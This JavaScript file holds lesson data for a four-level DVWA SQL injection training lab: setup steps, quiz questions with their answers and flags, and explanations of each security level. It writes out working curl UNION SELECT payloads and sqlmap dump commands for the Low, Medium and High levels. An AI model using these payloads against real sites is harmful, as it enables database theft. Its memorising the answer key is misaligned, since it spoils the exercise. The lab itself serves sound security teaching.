const LESSONS = [
  {
    title: "Level 1: Low Security",
    points: 60,
    content: "Welcome to the SQL Injection in DVWA lab! First, initialize your environment:\n\n1. Click 'Launch DVWA Instance' above to start your Docker container.\n2. Wait for the new tab to open. You will be on the DVWA Setup page.\n3. Scroll down to the bottom of the page and click the 'Create / Reset Database' button.\n4. After it resets, it will take you to the login screen. Log in using:\n   Username: admin\n   Password: password\n5. Go to 'DVWA Security' and set the security level to 'Low'.\n\n⚠️ IMPORTANT: Do NOT close the lab container until you complete all 4 challenges! If you stop the lab, you will need to start from the beginning (reset the database and login again) to get the challenges back.\n\nNavigate to the 'SQL Injection' tab. Your goal is to exploit the vulnerability and retrieve the flag for the Low level.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** Open your Kali Linux Docker terminal and use `curl` to manually inject the payload. Replace `[TARGET_IP]` and `your_session_id`:\n`curl \"http://[TARGET_IP]/vulnerabilities/sqli/?id=1'+UNION+SELECT+null,version()+%23&Submit=Submit\" -H \"Cookie: security=low; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** Let `sqlmap` automate the extraction:\n`sqlmap -u \"http://[TARGET_IP]/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"security=low; PHPSESSID=your_session_id\" --dump`",
    questions: [
      { q: "What is the default username for DVWA?", a: "admin" },
      { q: "What is the default password for DVWA?", a: "password" },
      { q: "Have you set the DVWA Security level to Low? (yes/no)", a: "yes" },
      { q: "What SQL keyword is typically used to append results from a second query?", a: "UNION" },
      { q: "Submit the flag for the Low security level:", a: "flag{low_sqli}" }
    ]
  },
  {
    title: "Level 2: Medium Security",
    points: 60,
    content: "Great job on Low security! Now, let's step it up.\n\n1. Go to 'DVWA Security' and change the level to 'Medium'.\n2. Return to the 'SQL Injection' tab.\n\nNotice that the input method has changed to a dropdown. The application now uses `mysqli_real_escape_string` to escape single quotes, but the input is treated as an integer.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** Use `curl` to send a POST request, bypassing the frontend dropdown completely. Notice we don't use single quotes in the payload:\n`curl -X POST \"http://[TARGET_IP]/vulnerabilities/sqli/\" -d \"id=1 UNION SELECT null,version()&Submit=Submit\" -H \"Cookie: security=medium; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** Use the `--data` flag in `sqlmap` to attack POST parameters:\n`sqlmap -u \"http://[TARGET_IP]/vulnerabilities/sqli/\" --data=\"id=1&Submit=Submit\" --cookie=\"security=medium; PHPSESSID=your_session_id\" --dump`",
    questions: [
      { q: "Does the Medium level use a GET or POST request for the vulnerable parameter?", a: "POST" },
      { q: "What built-in PHP function is often used to escape quotes in Medium security?", a: "mysqli_real_escape_string" },
      { q: "Can you still perform SQL injection without using single quotes? (yes/no)", a: "yes" },
      { q: "What tool can you use to intercept and modify the HTTP request?", a: "Burp Suite" },
      { q: "Submit the flag for the Medium security level:", a: "flag{medium_sqli}" }
    ]
  },
  {
    title: "Level 3: High Security",
    points: 60,
    content: "Time for High security!\n\n1. Set the DVWA Security level to 'High'.\n2. Go to the 'SQL Injection' tab.\n\nHere, the input is submitted on a pop-up page (`session-input.php`), while the output is displayed on the main page. This is a second-order vulnerability.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** This takes two commands. First, inject the payload into the session input page:\n`curl -X POST \"http://[TARGET_IP]/vulnerabilities/sqli/session-input.php\" -d \"id=1' UNION SELECT null,version() %23&Submit=Submit\" -H \"Cookie: security=high; PHPSESSID=your_session_id\"`\nNext, fetch the main page to see the extracted data:\n`curl \"http://[TARGET_IP]/vulnerabilities/sqli/\" -H \"Cookie: security=high; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** Use the `--second-url` flag to tell `sqlmap` where to look for the output:\n`sqlmap -u \"http://[TARGET_IP]/vulnerabilities/sqli/session-input.php\" --data=\"id=1&Submit=Submit\" --second-url=\"http://[TARGET_IP]/vulnerabilities/sqli/\" --cookie=\"security=high; PHPSESSID=your_session_id\" --dump`",
    questions: [
      { q: "In High security, is the vulnerable input on the same page as the output? (yes/no)", a: "no" },
      { q: "Does the High level restrict the use of single quotes like Medium level did? (yes/no)", a: "no" },
      { q: "Can you use the exact same payload as the Low level once you find the input field? (yes/no)", a: "yes" },
      { q: "What attack technique involves exploiting the application when input and output occur on different pages?", a: "Second-order SQL injection" },
      { q: "Submit the flag for the High security level:", a: "flag{high_sqli}" }
    ]
  },
  {
    title: "Level 4: Impossible Security",
    points: 60,
    content: "Finally, the 'Impossible' level.\n\n1. Set the DVWA Security level to 'Impossible'.\n2. Navigate to the SQL Injection tab and then examine the source code by clicking 'View Source' at the bottom right.\n\nThis level demonstrates how to properly secure PHP code against SQL injection using prepared statements.\n\n### Solving the Challenge (Kali Linux Docker)\n**Manual Terminal Tool (`curl`):** You can use `curl` to fetch the source code and confirm the use of PDO prepared statements, which block injection. (No injection payload will succeed).\n`curl \"http://[TARGET_IP]/vulnerabilities/sqli/source/impossible.php\" -H \"Cookie: security=impossible; PHPSESSID=your_session_id\"`\n\n**Automated Terminal Tool (`sqlmap`):** If you run `sqlmap` against this level, it will fail to find any injection points. The database is secure! Review the source to find the final flag.",
    questions: [
      { q: "What mechanism is used in the Impossible level to completely prevent SQL injection?", a: "Prepared Statements" },
      { q: "What PHP extension is typically used here to interact with the database safely? (Hint: PHP Data Objects)", a: "PDO" },
      { q: "Does a prepared statement separate the SQL structure from the data? (yes/no)", a: "yes" },
      { q: "Are prepared statements effective against most SQL injection attacks? (yes/no)", a: "yes" },
      { q: "Submit the flag for the Impossible security level:", a: "flag{impossible_sqli}" }
    ]
  }
];
